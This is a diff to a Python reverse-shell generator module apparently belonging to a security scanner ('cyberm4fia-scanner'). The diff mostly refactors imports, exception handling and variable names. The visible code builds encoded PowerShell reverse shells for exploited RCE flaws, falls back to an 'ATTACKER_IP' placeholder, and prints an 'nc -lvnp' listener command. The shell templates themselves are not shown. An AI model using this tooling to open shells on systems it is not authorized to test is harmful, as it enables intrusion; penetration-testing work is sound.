@@ -3,16 +3,12 @@ cyberm4fia-scanner - Reverse Shell Generator
 Generates ready-to-use reverse shell payloads for confirmed RCE/CMDi vulnerabilities
 """
 
-import sys
-import os
 import socket
 import base64
 from urllib.parse import quote
 
-sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-
-from utils.colors import log_info, log_success, log_warning
-
+from utils.colors import log_info, log_success
+from utils.request import ScanExceptions
 
 def get_local_ip():
     """Auto-detect local/public IP of the attacker's machine."""
@@ -22,9 +18,8 @@ def get_local_ip():
         ip = s.getsockname()[0]
         s.close()
         return ip
-    except Exception:
+    except ScanExceptions:
         return "ATTACKER_IP"
-
 
 # ─────────────────────────────────────────────────────
 # Shell Templates
@@ -165,16 +160,13 @@ SHELLS = {
 # Encoding helpers
 # ─────────────────────────────────────────────────────
 
-
 def encode_base64(payload):
     """Base64 encode a payload."""
     return base64.b64encode(payload.encode()).decode()
 
-
 def encode_url(payload):
     """URL encode a payload."""
     return quote(payload, safe="")
-
 
 def generate_powershell_encoded(ip, port):
     """Generate base64-encoded PowerShell reverse shell."""
@@ -192,7 +184,6 @@ def generate_powershell_encoded(ip, port):
     )
     encoded = base64.b64encode(ps_script.encode("utf-16-le")).decode()
     return f"powershell -e {encoded}"
-
 
 def generate_shells(ip=None, port=4444, platform="all", encoding=None):
     """
@@ -231,7 +222,6 @@ def generate_shells(ip=None, port=4444, platform="all", encoding=None):
 
     return results
 
-
 def auto_generate_for_vuln(vuln, ip=None, port=4444):
     """
     Auto-generate best reverse shell based on discovered vulnerability context.
@@ -240,11 +230,11 @@ def auto_generate_for_vuln(vuln, ip=None, port=4444):
     if ip is None:
         ip = get_local_ip()
 
-    recommendations = []
+    _ = []
 
     # Detect OS from vulnerability context
-    vuln_url = vuln.get("url", "").lower()
-    vuln_payload = vuln.get("payload", "").lower()
+    _ = vuln.get("url", "").lower()
+    _ = vuln.get("payload", "").lower()
     vuln_response = vuln.get("response", "").lower()
 
     is_windows = any(
@@ -278,7 +268,6 @@ def auto_generate_for_vuln(vuln, ip=None, port=4444):
     log_info(f"Listener command: nc -lvnp {port}")
 
     return sorted_shells
-
 
 def print_shells(shells, max_display=5):
     """Pretty-print generated shells."""
